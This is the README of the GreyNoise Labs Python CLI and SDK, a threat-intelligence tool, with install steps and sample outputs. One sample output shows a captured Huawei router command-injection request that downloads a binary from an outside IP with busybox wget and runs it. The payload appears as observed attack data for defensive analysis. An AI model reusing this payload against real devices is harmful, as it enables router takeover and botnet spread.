==========================================
Python GreyNoise Labs GraphQL Client & SDK
==========================================

.. image:: https://img.shields.io/badge/License-MIT-yellow.svg
    :target: https://opensource.org/licenses/MIT

This package provides a CLI and SDK to the `GreyNoise Labs API`_ service.

.. _GreyNoise Labs API: https://api.labs.greynoise.io/

The GreyNoise Labs API provides access to the GreyNoise sensor datasets,
including the raw sensor data, contextual metadata, and rapid prototyping utilities from the GreyNoise Labs team.

Please make sure you're always using the latest version of the CLI. This is an experimental service, older versions
of the CLI may not work as expected and the team does not gurantee semantic versioning with non-breaking changes. 
If you're experiencing an error, always attempt to update to the latest version first. 

You can update the CLI with ``python3 -m pip install greynoiselabs --upgrade``.

You can read more about the team and their work at `GreyNoise Labs`_

.. _GreyNoise Labs: https://www.labs.greynoise.io

Documentation
=============
Documentation is available here: `Documentation`_

.. _Documentation: https://api.labs.greynoise.io/1/docs

CLI Install
===========
1. Run ``python3 -m pip install greynoiselabs``
2. Run ``greynoiselabs init`` to authenticate with Auth0 and save credentials for future use.
3. (Optional) It is recommended to install `jq` to make the CLI output more readable. 
   You can install it with ``brew install jq`` on macOS or ``apt-get install jq`` on Ubuntu.

..  code-block:: bash

    You are not authenticated, would you like to do this now? [y/N]: y
    Device code successful
    1. Please browse to:  https://greynoise2.auth0.com/activate?user_code=ABCD-EFGH
    2. Verify the code matches:  ABCD-EFGH
    Please click the link above and follow the instructions...
    Please click the link above and follow the instructions...
    Please click the link above and follow the instructions...
    Token saved to /Users/user/Library/Application Support/greynoiselabs/0.1.19/token.json.
    Authentication successful
    Aborted.

Autocomplete
============
``greynoiselabs`` uses autocomplete by default. You can start typing a command like ``greynoiselabs pc`` and then hit tab twice. 

If you're using ZSH as your shell, you may need to add ``compinit -D`` to the end of your ``~/.zshrc`` file. 


CLI Quick Start
===============
- . To show usage just run ``greynoiselabs`` and you should see this output.

.. image:: https://github-production-user-asset-6210df.s3.amazonaws.com/30487781/256922968-bbed72e3-c973-4398-86d8-c4383ffa0283.png

-  ``greynoiselabs knocks --help`` to show command specific help like below.

.. image:: https://github-production-user-asset-6210df.s3.amazonaws.com/30487781/256923019-432213b0-6a10-4283-bc8e-2365368c977a.png

- Lets look at the Labs Command and Control server dataset.
  Run: ``greynoiselabs c2s | jq``
  
  Here we can see results that suggest this is a potential C2 because GreyNoise observed an HTTP 
  request that contained a nested wget command out to the 185[.]17[.]0[.]197 IP. 

..  code-block:: json

    {
      "source_ip": "210.103.85.34",
      "hits": 271,
      "pervasiveness": 11,
      "c2_ips": [
        "185.17.0.197"
      ],
      "c2_domains": [],
      "payload": "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nContent-Length: 430\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.17.0.197 -l /tmp/testin -r /.oDan2/lock.mips; /bin/busybox chmod 777 /tmp/testin; /tmp/testin hw.selfrep)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>\r\n\r\n"
    }

- Lets take a look at the Labs scan-back dataset a.k.a. "knockknock".
  Run: ``greynoiselabs knocks | jq``
    
  Here we can see that GreyNoise scanned an IP back that was observed scanning GreyNoise sensors and contained the HTTP title NetSurveillance WEB, likely a know IP camera DVR 
  with CVE-2017-16725.

..  code-block:: json

    {
      "source_ip": "36.70.32.117",
      "headers": "{\"Content-Type\":[\"text/html\"],\"Expires\":[\"0\"],\"Server\":[\"uc-httpd 1.0.0\"]}",
      "apps": "[{\"app_name\":\"Apache HTTP Server\",\"version\":\"\"}]",
      "emails": [],
      "favicon_mmh3_128": "Sgqu+Vngs9hrQOzD8luitA==",
      "favicon_mmh3_32": -533084183,
      "ips": [
        "10.2.4.88",
        "10.2.2.88"
      ],
      "knock_port": 80,
      "jarm": "00000000000000000000000000000000000000000000000000000000000000",
      "last_seen": "2023-07-21T11:00:06Z",
      "last_crawled": "2023-07-22T00:14:27Z",
      "links": [],
      "title": "NETSurveillance WEB",
      "tor_exit": false
    }

- Lets take a look at IPs that are commonly searched in GreyNoise datasets.  
  Run: ``greynoiselabs popular-ips | jq``

  Here we can see that 143.244.50.173 has been searched 916 times by 95 different GreyNoise users and 
  was last seen on 2023-07-27T23:59:11Z by GreyNoise sensors and last requested on 2023-07-27T23:55:17Z.

..  code-block:: json

    {
      "ip": "143.244.50.173",
      "request_count": 916,
      "users_count": 95,
      "last_requested": "2023-07-27T23:55:17Z",
      "noise": true,
      "last_seen": "2023-07-27T23:59:11Z"
    }

- Lets take a look at IPs making the most noise.
  Run: ``greynoiselabs noise-rank | jq``

  Here we can see that 167.94.138.35 is very pervasive throughout countries and sensors, is generating a 
  significant amount of traffic, and is targeting a large number of ports. However, the number of distinct 
  payloads it is generating falls in the middle compared with our IPs observed by GreyNoise. 

..  code-block:: json

    {
      "ip": "167.94.138.35",
      "noise_score": 89,
      "country_pervasiveness": "very high",
      "payload_diversity": "med",
      "port_diversity": "very high",
      "request_rate": "high",
      "sensor_pervasiveness": "very high"
    }

- Lets use some simple human language to search GreyNoise datasets.
  Run: ``greynoiselabs gengnql "Show malicious results that are targeting ukraine from russia"``
  
  Here we can see that the CLI is able to parse the human language and generate a set of GNQL queries that you may not have thought of.
  
  Results will differ for `gengnql` on subsequent runs as this is using an GPT prompt.

..  code-block:: bash

    classification:malicious AND metadata.country:Russia AND destination_country:Ukraine
    metadata.country:Russia AND destination_country:Ukraine AND classification:malicious
    metadata.country_code:RU AND destination_country_code:UA AND classification:malicious
    classification:malicious AND metadata.country_code:RU AND destination_country_code:UA
    destination_country:Ukraine AND metadata.country:Russia AND classification:malicious

- Lets take a PCAP and pivot on it to see what interesting artifacts we can extract from it to search in 3rd party tools and datasets. 
  Run: ``greynoiselabs pcap pivot sample.pcap | jq``

  Here we can see that the CLI is able to parse the PCAP and extract the number of requests sent to a port, and the HTTP paths and User-Agents that were used.

.. code-block:: json 

   {
    "first_seen": "2023-08-29T19:14:06.88876Z",
    "ip": "84.54.51.99",
    "last_seen": "2023-08-29T19:14:07.034411Z",
    "user_agents": [],
    "port_counts": [
      {
        "count": 5,
        "port": "80/TCP"
      }
    ],
    "paths": [
      "/boaform/admin/formLogin"
    ],
    "ja3": [],
    "hassh": [],
    "hostnames": []
  }

- Lets take a PCAP and convert it to a series of GNQL queries that can be used to search GreyNoise datasets.
  Run: ``greynoiselabs pcap gnql sample.pcap | jq``

  Here you can see that we were able to extract 11 SSH Hassh fingerprints, 1 HTTPS JA3 fingerprint, and 15 different RNDS hostnames that were then converted into GNQL queries. 

.. code-block:: json
 
  {
    "type": "raw_data.hassh.fingerprint",
    "urls": [
      "https://viz.greynoise.io/query?gnql=raw_data.hassh.fingerprint:4e066189c3bbeec38c99b1855113733a%20OR%20raw_data.hassh.fingerprint:98f63c4d9c87edbd97ed4747fa031019%20OR%20raw_data.hassh.fingerprint:92674389fa1e47a27ddd8d9b63ecd42b%20OR%20raw_data.hassh.fingerprint:2aec6b44b06bec95d73f66b5d30cb69a%20OR%20raw_data.hassh.fingerprint:acaa53e0a7d7ac7d1255103f37901306%20OR%20raw_data.hassh.fingerprint:9d31b8e6c87f893d077ca6526f7c710b%20OR%20raw_data.hassh.fingerprint:873a5fb5fedc2d4f8638ebde4abc6cfc%20OR%20raw_data.hassh.fingerprint:7216c7c473918b4f83d1139b3c70dbf9%20OR%20raw_data.hassh.fingerprint:1df281da760a0c16d115179a9ea5957c%20OR%20raw_data.hassh.fingerprint:dd9bcf093c355da7000132131cb36fd0%20OR%20raw_data.hassh.fingerprint:ec7378c1a92f5a8dde7e8b7a1ddf33d1&utm_medium=labs_blueprint&utm_source=pivot"
    ]
  }
  {
    "type": "raw_data.ja3.fingerprint",
    "urls": [
      "https://viz.greynoise.io/query?gnql=raw_data.ja3.fingerprint:674a73e1c587a5355cb37e25e6bebe48&utm_medium=labs_blueprint&utm_source=pivot"
    ]
  }
  {
    "type": "metadata.rdns",
    "urls": [
      "https://viz.greynoise.io/query?gnql=metadata.rdns:ip.parrotdns.com%20OR%20metadata.rdns:com%20OR%20metadata.rdns:03914d09.asertdnsresearch.com%20OR%20metadata.rdns:59854089.round2023-08-30.odns.m.dnsscan.top%20OR%20metadata.rdns:VERSION.BIND%20OR%20metadata.rdns:03914d09.example.com%20OR%20metadata.rdns:tstng.net%20OR%20metadata.rdns:www.stage%20OR%20metadata.rdns:mz.gov.pl%20OR%20metadata.rdns:version.bind%20OR%20metadata.rdns:www.cybergreen.net%20OR%20metadata.rdns:www.google.com%20OR%20metadata.rdns:example.com%20OR%20metadata.rdns:dnsscan.shadowserver.org%20OR%20metadata.rdns:sl&utm_medium=labs_blueprint&utm_source=pivot"
    ]
  }

CLI Advanced Usage
==================
Show the most popular IPs that are searched at GreyNoise but not observed by our sensors
1. ``greynoiselabs popular-ips | jq '. | select(.noise == false)' | less``

Group the ip's hitting GreyNoise sensors by their HTTP page title
2. ``greynoiselabs knocks | jq -s 'group_by(.title) | map({title: .[0].title, agg: map(.source_ip) })'``

Show distinct HTTP web paths that were crawled by a User-Agent
3. ``greynoiselabs http-requests --user-agent 'zgrab' | jq '.path' | uniq``

Filter payloads by protocol
4. ``greynoiselabs payloads --protocol TCP``


SDK Quick Start
===============
**Install the library**:

``python3 -m pip install greynoiselabs`` or ``make install`` when in the root directory of the repository.

Example SDK Code

You can authenticate to the Labs API and obtain a copy of your token there 
or with the CLI after running ``greynoiselabs init``

..  code-block:: python

    import os
    import asyncio
    from greynoiselabs.client import Client

    client = Client("https://api.labs.greynoise.io/1/query",
                    {"Authorization": f"Bearer {os.environ['AUTH_TOKEN']}"})

    response = asyncio.run(client.top_knocks(ip="221.144.229.187"))
    print(response)
